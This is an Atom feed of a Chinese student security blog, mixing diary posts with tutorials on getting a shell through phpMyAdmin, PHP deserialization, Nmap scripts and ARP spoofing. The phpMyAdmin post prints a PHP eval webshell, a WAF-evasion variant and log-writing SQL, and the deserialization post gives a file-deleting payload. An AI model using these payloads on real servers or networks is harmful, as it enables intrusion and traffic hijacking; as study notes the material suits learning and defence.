<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Isleak&#39;s blog</title>
  
  <subtitle>Isleak&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-11-25T11:14:25.538Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>枭雄</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>getshell技巧-phpMyAdmin的利用</title>
    <link href="http://yoursite.com/2018/11/26/PHPMyAdmin%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2018/11/26/PHPMyAdmin利用/</id>
    <published>2018-11-26T13:28:05.000Z</published>
    <updated>2018-11-25T11:14:25.538Z</updated>
    
    <content type="html"><![CDATA[<p>生活就是泥沙俱下，鲜花和荆棘并存。——毕淑敏<br><a id="more"></a></p><h1 id="getshell的思路"><a href="#getshell的思路" class="headerlink" title="getshell的思路"></a>getshell的思路</h1><p>1、明确目标<br>2、信息收集<br>3、漏洞挖掘和利用</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="明确路径"><a href="#明确路径" class="headerlink" title="明确路径"></a>明确路径</h2><p>利用目录扫描工具，对目标网站进行扫描，获取网站目录。常用工具有Kali中的DirBuster、dirb和wwwscan等。<br>我用的是Kali中的DirBuster，对目标进行扫描。<br><img src="/2018/11/26/PHPMyAdmin利用/1.png" alt="目录扫描结果"></p><h2 id="明确版本"><a href="#明确版本" class="headerlink" title="明确版本"></a>明确版本</h2><p>利用内置的文件，（…../phpMyAdmin/README）获取phpMyAdmin的版本信息。<br><img src="/2018/11/26/PHPMyAdmin利用/2.png" alt=""><br>一般网站管理员不会把这个目录删除，所以可以成为我们利用的一个点。</p><h2 id="明确登录口令"><a href="#明确登录口令" class="headerlink" title="明确登录口令"></a>明确登录口令</h2><p>有两种方法，手工和暴力破解。手工就是用一些弱口令进行猜解。<br>暴力破解可以用phpMyAdmin多线程批量破解工具来对phpMyAdmin进行暴力破解。<br><img src="/2018/11/26/PHPMyAdmin利用/3.png" alt="phpMyAdmin多线程批量破解工具"><br>但是工具只是给我们提供参考的，而且工具爆破对phpMyAdmin的版本有一定的要求。</p><h2 id="明确系统类型"><a href="#明确系统类型" class="headerlink" title="明确系统类型"></a>明确系统类型</h2><p>因为系统版本的不同，对权限的控制是不同的。Linux系统对权限的控制相对严格，而window则相对较为疏散的。所以说对window进行getshell相比Linux要容易。</p><h2 id="明确php版本和数据库版本"><a href="#明确php版本和数据库版本" class="headerlink" title="明确php版本和数据库版本"></a>明确php版本和数据库版本</h2><p>可以在phpMyAdmin的管理也可以看到php版本、MySQL版本，系统类型。<br><img src="/2018/11/26/PHPMyAdmin利用/4.png" alt="phpMyAdmin多线程批量破解工具"><br>因为php版本的差异，对渗透的利用是不一样的。</p><h1 id="获取网站真实路径"><a href="#获取网站真实路径" class="headerlink" title="获取网站真实路径"></a>获取网站真实路径</h1><h2 id="phpinfo-函数直接获取"><a href="#phpinfo-函数直接获取" class="headerlink" title="phpinfo()函数直接获取"></a>phpinfo()函数直接获取</h2><p>通过phpinfo.php或者phpinfo()进行获取网站真实路径。<br><img src="/2018/11/26/PHPMyAdmin利用/5.png" alt=""><br>phpinfo.php中会有大量的信息，有php版本、网站路径等。</p><h2 id="构造报错页面获取网站真实路径"><a href="#构造报错页面获取网站真实路径" class="headerlink" title="构造报错页面获取网站真实路径"></a>构造报错页面获取网站真实路径</h2><p>通过构造报错可能会报出网站的真实路径。常见的有页面访问报错、sql注入报错，文件包含报错。<br>phpmyadmin报错常见路径：<br>     /phpMyAdmin/libraries/lect_lang.lib.php<br>     /phpMyAdmin/index.php?lang[]=1<br>     /phpMyAdmin/phpinfo.php<br>     /phpMyAdmin/themes/darkblue_orange/layout.inc.php<br>     /phpMyAdmin/libraries/select_lang.lib.php<br>     /phpMyAdmin/libraries/lect_lang.lib.php<br>     /phpMyAdmin/libraries/mcrypt.lib.php</p><h2 id="借助搜索引擎"><a href="#借助搜索引擎" class="headerlink" title="借助搜索引擎"></a>借助搜索引擎</h2><p>借助搜索引擎，例如：百度、谷歌、fofa、shadon、zoomeye等，搜索关键字“error”,可能会报出网站的真实路径。</p><h1 id="漏洞挖掘和利用"><a href="#漏洞挖掘和利用" class="headerlink" title="漏洞挖掘和利用"></a>漏洞挖掘和利用</h1><h2 id="满足写shell的前提条件"><a href="#满足写shell的前提条件" class="headerlink" title="满足写shell的前提条件"></a>满足写shell的前提条件</h2><p>SHOW VARIABLES LIKE “%secure_file_priv%”;  查看读写文件路径 “secure_file_priv”对应的值不能为null，为null就不能正常写入shell。</p><h2 id="日志写shell"><a href="#日志写shell" class="headerlink" title="日志写shell"></a>日志写shell</h2><p>首先需要检测MySQL全局变量（general_log、general_log_file）的值。<br>general_log是日志保存状态，一共有两个值（ON/OFF）,ON代表开启，OFF代表关闭。<br>general_log_file是日志的保存路径<br>1、开启日志保存<br>      set global general_log=”ON”;<br>      set global general_log_file=”D:/phpStudy/WWW/infos.php”（网站真实路径）<br>2、写shell<br>      select  ‘&lt;?php eval($_POST[yumu)];?&gt;’<br>免杀（绕过安全狗）<br>      $arr = array(‘a’,’s’,’s’,’s’,’e’,’r’,’t’);<br>      $func = “”;<br>      for($i=0;$i&lt;count($arr);$i++){<br>      $func = $func.$arr[$i];<br>      }<br>      $func = substr($func,-6);<br>      $func($_REQUEST[‘c’]);</p><p>#总结<br>在利用phpMyAdmin来getshell时，需要注意对网站信息的收集，特别是网站的PHP版本、网站真实路径。这样才能更好的对网站就行漏洞挖掘。</p><h1 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h1><p><a href="https://xz.aliyun.com/t/2222" target="_blank" rel="noopener">从phpinfo到phpmyadmin的综合渗透利用</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;生活就是泥沙俱下，鲜花和荆棘并存。——毕淑敏&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>新的学习，新的征程</title>
    <link href="http://yoursite.com/2018/11/11/%E6%9C%80%E8%BF%91%E7%9A%84%E6%84%9F%E6%83%B3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2018/11/11/最近的感想（一）/</id>
    <published>2018-11-11T03:11:11.000Z</published>
    <updated>2018-11-11T11:03:17.508Z</updated>
    
    <content type="html"><![CDATA[<p>单身快乐吧！！！！<br><a id="more"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天考完了软考，休息了半天吧！软考考完可以说自己的一段学习历程结束了。接下来开始新的学习历程。下面来对自己的前段时间的学习做个总结，也对接下来的学习计划一下。</p><h1 id="软考"><a href="#软考" class="headerlink" title="软考"></a>软考</h1><h2 id="了解软考"><a href="#了解软考" class="headerlink" title="了解软考"></a>了解软考</h2><p>软考，我应该是在六月初准备，当时有点想法就去了解了。一开始不知道要报什么科目（软考有很多科目和等级）。最先知道有信息安全工程师，就像去考信息安全工程师，但是了解到信息安全工程师每年只有一次考试，而却在五月（已经过去了）。后来就重新考虑了一下，决定了报网络工程师。</p><h2 id="软考准备"><a href="#软考准备" class="headerlink" title="软考准备"></a>软考准备</h2><p>在软考准备期间，经过了一个暑假，在暑假的前一个月，在学习待，为了更好地准备软考。之后一个月在家待着，发现家里不是学习的地，天天跟咸鱼一样。所以可以说是在九月才开始我的软考准备。先是把网络工程师的官方教材搭配视频看；后把教材看完了，就把从04到16年的真题看了一遍；先开始主要看实物的选择题（软考分上午题和下午题，上午综合知识选择题、下午配置填空题）；到10月份中旬时，就看了两本书（《网络工程师五天修炼》和《考前100题》），这两本书让我对知识的总结很有帮助。到11月份的时候，就把17年和18年上半年的题做了一遍，又把真题看了一遍。就这样一直到前天。<br><img src="/2018/11/11/最近的感想（一）/1.jpg" alt="软考自己用的资料"></p><h2 id="软考总结"><a href="#软考总结" class="headerlink" title="软考总结"></a>软考总结</h2><p>话说，当时我为什么会想到要考软考呢？在我当时是这样想的。我觉得这个证书对自己以后考研或者工作可能有帮助，同时也是对自己的学习能力的一种提升。所以总的来说，这个软考学习过程中让我发现自己的学习能力如何，自己的专注力怎么样，自己适合什么样的学习方法。</p><h1 id="以后的计划"><a href="#以后的计划" class="headerlink" title="以后的计划"></a>以后的计划</h1><p>软考考完了，我接下来要好好准备英语四级了（考了两次没过），还有开始学数据结构。因为我要考研，而且我还是想跨考网络空间安全这个专业。从大一来到这个选项，自己心中就有着自己的名校梦，自己过去没有成功，所以考研来源自己的梦。同时了解了考研学校的专业课是数据结构；还有是数学。所以我在大三上学期的剩下时间做以下计划。（每天早上七点到实验室，22点左右回寝室）<br>    1、7:05到7:40背单词；<br>    2、18:00到19:00英语；<br>    3、19:00到20:30 周一、三、五 数据结构，二、四、六 数学<br>    4、20:45到22:00 课程作业、学网络安全相关的。</p><p><img src="/2018/11/11/最近的感想（一）/2.jpg" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>真香！！<br><img src="/2018/11/11/最近的感想（一）/3.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;单身快乐吧！！！！&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="生活" scheme="http://yoursite.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="感想" scheme="http://yoursite.com/tags/%E6%84%9F%E6%83%B3/"/>
    
      <category term="计划" scheme="http://yoursite.com/tags/%E8%AE%A1%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化漏洞</title>
    <link href="http://yoursite.com/2018/10/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/10/24/php反序列化漏洞/</id>
    <published>2018-10-24T13:28:05.000Z</published>
    <updated>2018-11-11T01:43:33.126Z</updated>
    
    <content type="html"><![CDATA[<p>php反序列化漏洞又称对象注入，可能会导致注入，远程执行等安全问题的发生。<br><a id="more"></a></p><h1 id="php序列化与反序列化原理"><a href="#php序列化与反序列化原理" class="headerlink" title="php序列化与反序列化原理"></a>php序列化与反序列化原理</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>（1）序列化是将变量转换为可保存或传输的字符串的工程。<br>（2）反序列化是在适当的时候把这个字符串在转化成原来的变量使用。</p><h2 id="php序列化与反序列化函数"><a href="#php序列化与反序列化函数" class="headerlink" title="php序列化与反序列化函数"></a>php序列化与反序列化函数</h2><p>php中有两个函数serialize() 和unserialize()。<br>（1）Serialize ：可以将变量转换为字符串并且在转换中可以保存当前变量的值。<br>（2）unserialize :可以将serialize生成的字符串变换回变量。</p><h2 id="php序列化实例"><a href="#php序列化实例" class="headerlink" title="php序列化实例"></a>php序列化实例</h2><p>serialiae()<br>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。<br><img src="/2018/10/24/php反序列化漏洞/1.png" alt=""></p><p>unserialiae()<br>与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。<br><img src="/2018/10/24/php反序列化漏洞/2.png" alt=""></p><h2 id="php魔法函数"><a href="#php魔法函数" class="headerlink" title="php魔法函数"></a>php魔法函数</h2><p>（1 ）php类中包含了一些魔法函数，这些函数可以在脚本的任何一个地方不用声明就可以使用。<br>（2 ）与php（反）序列化有关魔法函数：<br><strong>construct() :当一个对象创建时被调用</strong>destruct() ：对象被销毁时触发<br><strong>toString()  :把类当作字符串使用时触发</strong>wakeup() :所有unserialize时触发<br><strong>sleep():使用serialize时触发</strong>get()： 用于从不可访问的属性读取数据<br><strong>set() :用于将数据写入不可访问的属性</strong>isset(): 在不可访问的属性上调用isset()或empty()触发<br><strong>unset() :在不可访问的属性上使用unset()时触发</strong>invoke()：  当脚本尝试将对象调用为函数是触发<br><img src="/2018/10/24/php反序列化漏洞/3.png" alt=""></p><h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h1><h2 id="php反序列化漏洞如何产生"><a href="#php反序列化漏洞如何产生" class="headerlink" title="php反序列化漏洞如何产生"></a>php反序列化漏洞如何产生</h2><p>如果一个php代码中使用unserialize函数去跳跃某一类，该类中会执行一些自定义的magic method,这些magic method中如果包含了一些危险的操作，或者这些magic method会去调用类中其他带有危险操作的函数，如果这些危险操作是我们可控的，那么就可以进行一些不可描述的操作。</p><h2 id="php反序列化漏洞实例"><a href="#php反序列化漏洞实例" class="headerlink" title="php反序列化漏洞实例"></a>php反序列化漏洞实例</h2><p><img src="/2018/10/24/php反序列化漏洞/4.png" alt=""></p><p>在代码中可以看到，delete类中定义了一个__destruct()函数，该函数中执行删除文件的操作。如果想利用该类来执行任意文件删除操作，需要寻找一个可控的unserialize()函数。</p><p><img src="/2018/10/24/php反序列化漏洞/5.png" alt=""></p><p>在上例中可以看到包含了phpftest4.php，并且在最后可以看到<br>$leak = unserialize($_GET[‘leak_serialized’]);<br>leak_serialized是可控的。</p><p>如果已经知道在目录上有一个delete.txt文件。如果想要删除这个文件，则可以这样构造poc.<br><img src="/2018/10/24/php反序列化漏洞/6.png" alt=""></p><p>访问 phpftest5.php<br>?leak_serialized=O:6:”Isleak”::{s:4:”name”;s:4:”Tool”;s:3:”age”;i:18;}<br><img src="/2018/10/24/php反序列化漏洞/7.png" alt=""></p><p>访问delete.txt<br><img src="/2018/10/24/php反序列化漏洞/8.png" alt=""><br>delete.txt文件已删除</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>php反序列化漏洞利用的是在上述实例中定义的leak_serialized类，利用这个类来把delete.txt文件删除。</p><h1 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h1><p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">浅谈php反序列化漏洞</a><br><a href="https://www.bugbank.cn/live/view.html?id=111109" target="_blank" rel="noopener">PHP反序列化getshell原理与实战</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php反序列化漏洞又称对象注入，可能会导致注入，远程执行等安全问题的发生。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>在实验室一年的感受</title>
    <link href="http://yoursite.com/2018/09/06/%E5%9C%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E4%B8%80%E5%B9%B4%E7%9A%84%E6%84%9F%E5%8F%97/"/>
    <id>http://yoursite.com/2018/09/06/在实验室一年的感受/</id>
    <published>2018-09-06T13:22:52.000Z</published>
    <updated>2018-11-11T01:42:51.407Z</updated>
    
    <content type="html"><![CDATA[<p>很多事情远不像想象得那么难，只是害怕犯错才变得束手束脚。确定了目标，尽管勇敢地出发就好。只要出发，最难的就已经过去大半。其实无论选择哪一条路，都会有不同的风景。不辜负勇敢前行的自己，就是最好的奖赏。<br>                                                                        ——小片段<br><a id="more"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在已经步入大三了，进入实验室也快一年了。在这一年里有收获也有失去吧！那我来谈谈我一年在实验室的感受吧。</p><h2 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h2><p>在学习方面有了自己的学习方向。因为离开了比较累的高中生活，在来到大学后的一段时间，我都是过的浑浑噩噩的，学习没有乐趣，对自己的专业课没有兴趣（更多的是大一不了解自己的专业），就这样带着无趣的专业学习过完了大一一年。在大一暑假经过自己的深思熟虑，去了解自己到底喜欢什么，对什么有兴趣，可以去学哪方面。得到了自己对软件（计算机方面）方面更有兴趣，而并不是自己所学专业的硬件（底层）方面。<br>来到大二，自己看到了信息安全实验室的招新信息，自己就尝试着去面试，看能不能让我更好的去学习自己喜欢的东西。<br>来到实验室，对自己感兴趣的进行更多的了解，同时结合实验室的一下资源，最终有了自己的学习方向——学习信息安全方面（web安全，网络技术）。在实验室，每天有着很大学习环境，更重要的有一起学习、交流的人。</p><h2 id="生活方面"><a href="#生活方面" class="headerlink" title="生活方面"></a>生活方面</h2><p>在生活方面，生活规律更正常了。每天早上7点离开寝室，晚上9点回寝室。每天过着差不多的生活，基本上每天都是寝室和十栋教学楼（上课和实验室都在十栋）两点来回，偶尔一周一两次在球场出现。<br>每天都是这样的生活，在很多人眼里可能是平淡无味的，我有时也觉得这样的生活是不是自己想要的。每当自己有这样的想法，等会想向当初自己选择，选择进实验室。<br>在实验室的一年里，自己每天早起（6点半左右），影响到了室友，也是会和室友的关系有点紧张。同时也失去了其他的娱乐生活，但是我觉得大学生活应该这样。</p><h2 id="后语"><a href="#后语" class="headerlink" title="后语"></a>后语</h2><p>进入实验室之后我才发现，这样才是我想要的大学生活。在实验室，有了自己的学习兴趣，有了自己的规划。可能失去了其他一些东西。总的来说，我当初进入实验室是非常对的决定。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;很多事情远不像想象得那么难，只是害怕犯错才变得束手束脚。确定了目标，尽管勇敢地出发就好。只要出发，最难的就已经过去大半。其实无论选择哪一条路，都会有不同的风景。不辜负勇敢前行的自己，就是最好的奖赏。&lt;br&gt;                                                                        ——小片段&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="生活" scheme="http://yoursite.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="感受" scheme="http://yoursite.com/tags/%E6%84%9F%E5%8F%97/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透（二）——Nmap脚本的使用</title>
    <link href="http://yoursite.com/2018/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://yoursite.com/2018/07/24/内网渗透（二）/</id>
    <published>2018-07-24T01:28:05.000Z</published>
    <updated>2018-11-11T01:41:00.943Z</updated>
    
    <content type="html"><![CDATA[<p>请你坚定地，沿着自己选择的路走下去。你的所有美好， 世人都看得到 。你的所有坚持， 也都一定会有回报。<br>                                                                   ——小插曲<br><a id="more"></a></p><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Nmap，也就是Network Mapper，最早是Linux下的网络扫描和嗅探工具包。<br>nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。<br>正如大多数被用于网络安全的工具，nmap 也是不少黑客及骇客（又称脚本小子）爱用的工具 。系统管理员可以利用nmap来探测工作环境中未经批准使用的服务器，但是黑客会利用nmap来搜集目标电脑的网络设定，从而计划攻击的方法。<br>Nmap 常被跟评估系统漏洞软件Nessus 混为一谈。Nmap 以隐秘的手法，避开闯入检测系统的监视，并尽可能不影响目标系统的日常操作。<br>本文主要讲述Nmap的简单扫描和脚本使用，在内网渗透中很好用。</p><h1 id="0x01-Nmap的简单使用"><a href="#0x01-Nmap的简单使用" class="headerlink" title="0x01 Nmap的简单使用"></a>0x01 Nmap的简单使用</h1><p> nmap 192.168.10.0/24 ：扫描网段内存活的主机<br> nmap -A 192.168.10.118 : 扫描目标主机的开放端口<br> nmap -O 192.168.10.118 ：扫描目标主机的系统信息<br> namp -PN 192.168.10.118 ：对目标主机进行深度扫描<br> nmap -PS 192.168.10.118 ：ICMP地址阻塞时使用</p><h1 id="0x02-Nmap的脚本使用"><a href="#0x02-Nmap的脚本使用" class="headerlink" title="0x02 Nmap的脚本使用"></a>0x02 Nmap的脚本使用</h1><p>nmap脚本主要分为以下⼏几类，在扫描时可根据需要设置–script=类别这种⽅方式进⾏行⽐比较笼统的扫描：</p><p>auth:           负责处理鉴权证书（绕开鉴权）的脚本<br>broadcast:  在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务<br>brute:          提供暴力破解方式，针对常见的应用如http/snmp等<br>default:       使用-­‐sC或-­‐A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>discovery： 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>dos:             用于进行拒绝服务攻击<br>exploit:       利用已知的漏洞入侵系统<br>external:     利用第三方的数据库或资源，例如进行whois解析<br>fuzzer：       模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞    </p><p>intrusive:   入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽<br>safe：         此类与intrusive相反，属于安全性脚本<br>malware:    探测目标机是否感染了病毒、开启了后门等信息<br>version:      负责增强服务与版本扫描（Version Detection）功能的脚本<br>vuln:           负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</p><h2 id="部分脚本的使用"><a href="#部分脚本的使用" class="headerlink" title="部分脚本的使用"></a>部分脚本的使用</h2><p> （1）nmap –script=auth 192.168.10.*<br>负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令<br><img src="/2018/07/24/内网渗透（二）/1.png" alt=""><br><img src="/2018/07/24/内网渗透（二）/2.png" alt=""></p><p>（2）nmap –script=brute 192.168.10.*<br>提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解<br><img src="/2018/07/24/内网渗透（二）/3.png" alt=""></p><p>（3）nmap –script=default 192.168.10.*<br>默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击<br><img src="/2018/07/24/内网渗透（二）/4.png" alt=""><br><img src="/2018/07/24/内网渗透（二）/5.png" alt=""></p><p>（4）nmap –script=vuln 192.168.10.*<br>检查是否存在常见漏洞<br><img src="/2018/07/24/内网渗透（二）/6.png" alt=""><br><img src="/2018/07/24/内网渗透（二）/7.png" alt=""></p><h1 id="推荐书籍"><a href="#推荐书籍" class="headerlink" title="推荐书籍"></a>推荐书籍</h1><p>《Nmap渗透测试指南》</p><h1 id="参阅文章"><a href="#参阅文章" class="headerlink" title="参阅文章"></a>参阅文章</h1><p><a href="http://www.nmap.com.cn/doc/manual.shtm" target="_blank" rel="noopener">Nmap中文手册</a><br><a href="http://www.addon.pub/2018/04/27/nmap%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">Nmap脚本编写初探</a><br><a href="https://www.bugbank.cn/live/view.html?id=109522" target="_blank" rel="noopener">Nmap正确烹饪及食用方法</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;请你坚定地，沿着自己选择的路走下去。你的所有美好， 世人都看得到 。你的所有坚持， 也都一定会有回报。&lt;br&gt;                                                                   ——小插曲&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Kali Linux" scheme="http://yoursite.com/tags/Kali-Linux/"/>
    
      <category term="Tool" scheme="http://yoursite.com/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透（一）</title>
    <link href="http://yoursite.com/2018/07/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2018/07/16/内网渗透（一）/</id>
    <published>2018-07-16T11:11:46.000Z</published>
    <updated>2018-11-11T01:42:44.679Z</updated>
    
    <content type="html"><![CDATA[<h2 id="本文摘要"><a href="#本文摘要" class="headerlink" title="本文摘要"></a>本文摘要</h2><p>本文讲述内容分为两部分，前半部分讲述ARP协议及ARP攻击原理，后半部分讲述在Kali Linux环境下如何实现ARP攻击、ARP欺骗以及IP流量转发，如果对于ARP攻击的背景和原理不感兴趣的话可以直接翻到下面查看操作方法。<br><a id="more"></a></p><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><pre><code>基本功能局限性攻击原理</code></pre><h3 id="Kali-Linux下的实现"><a href="#Kali-Linux下的实现" class="headerlink" title="Kali Linux下的实现"></a>Kali Linux下的实现</h3><pre><code>ARP攻击IP流量转发ARP欺骗</code></pre><h2 id="ARP协议-1"><a href="#ARP协议-1" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址   解析成对应的MAC地址。</p><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。</p><h3 id="APR攻击的局限性"><a href="#APR攻击的局限性" class="headerlink" title="APR攻击的局限性"></a>APR攻击的局限性</h3><p>ARP攻击仅能在以太网（局域网如：机房、内网、公司网络等）进行。<br>无法对外网（互联网、非本区域内的局域网）进行攻击。</p><h3 id="APR攻击原理"><a href="#APR攻击原理" class="headerlink" title="APR攻击原理"></a>APR攻击原理</h3><p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者   只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><h2 id="Kali-Linux下的实现-1"><a href="#Kali-Linux下的实现-1" class="headerlink" title="Kali Linux下的实现"></a>Kali Linux下的实现</h2><h3 id="攻击环境"><a href="#攻击环境" class="headerlink" title="攻击环境"></a>攻击环境</h3><p>攻击主机：Kali Linux 2.0<br>IP：192.168.43.10<br>目标主机：Windows 7<br>IP：192.168.43.79</p><h3 id="APR攻击"><a href="#APR攻击" class="headerlink" title="APR攻击"></a>APR攻击</h3><p>首先用ifconfig来查看攻击主机的IP地址和网卡：<br><img src="/2018/07/16/内网渗透（一）/1.png" alt=""></p><p>知道了主机的IP地址，之后查看网段存活的主机：<br><img src="/2018/07/16/内网渗透（一）/2.png" alt=""><br>目标主机<br><img src="/2018/07/16/内网渗透（一）/3.png" alt=""></p><p>用arpspoof工具对目标主机进行APR攻击(arpspoof -i 网卡 -t 目标IP 网关)：<br><img src="/2018/07/16/内网渗透（一）/4.png" alt=""></p><p>这时候目标主机不能正常上网：<br><img src="/2018/07/16/内网渗透（一）/5.png" alt=""></p><p>停止APR攻击，目标主机又能正常上网了。</p><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p> 首先，我们要使用的工具还是arpspoof，因为我们此次攻击方式是欺骗，同时，我们还是用Eteercap去嗅探目标靶子的流量。<br>但是，首先要开始IP转发功能，linux因为系统安全考虑，是不支持IP转发的，其配置文件写在/proc/sys/net/ipv4的ip_forward中。默认为0，接下来修改为1。<br>查看内容：cat  /proc/sys/net/ipv4/ip_forward<br>启动文本模式:ettercap -Tq -i eth0   </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;本文摘要&quot;&gt;&lt;a href=&quot;#本文摘要&quot; class=&quot;headerlink&quot; title=&quot;本文摘要&quot;&gt;&lt;/a&gt;本文摘要&lt;/h2&gt;&lt;p&gt;本文讲述内容分为两部分，前半部分讲述ARP协议及ARP攻击原理，后半部分讲述在Kali Linux环境下如何实现ARP攻击、ARP欺骗以及IP流量转发，如果对于ARP攻击的背景和原理不感兴趣的话可以直接翻到下面查看操作方法。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Kali Linux" scheme="http://yoursite.com/tags/Kali-Linux/"/>
    
  </entry>
  
  <entry>
    <title>blog-start</title>
    <link href="http://yoursite.com/2018/07/15/start-blog/"/>
    <id>http://yoursite.com/2018/07/15/start-blog/</id>
    <published>2018-07-15T07:16:06.000Z</published>
    <updated>2018-07-24T00:41:14.606Z</updated>
    
    <content type="html"><![CDATA[<p><font size="5"> 前言 </font><br>这个博客是用Hexo来搭建的。以前用WordPress搭建够一个博客，但是主题风格不怎么好。前一段时间在一个论坛上看见用Hexo的博客还可以。所以自己来尝试一下，发现这个页面风格真的挺不错的。</p><p><font size="5"> 后传 </font><br>本博客主要来分享自己在学习中的一下技术分享。内容有python爬虫，Web安全，CTF等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;font size=&quot;5&quot;&gt; 前言 &lt;/font&gt;&lt;br&gt;这个博客是用Hexo来搭建的。以前用WordPress搭建够一个博客，但是主题风格不怎么好。前一段时间在一个论坛上看见用Hexo的博客还可以。所以自己来尝试一下，发现这个页面风格真的挺不错的。&lt;/p&gt;
&lt;p&gt;&lt;fo
      
    
    </summary>
    
    
      <category term="blog" scheme="http://yoursite.com/tags/blog/"/>
    
  </entry>
  
</feed>
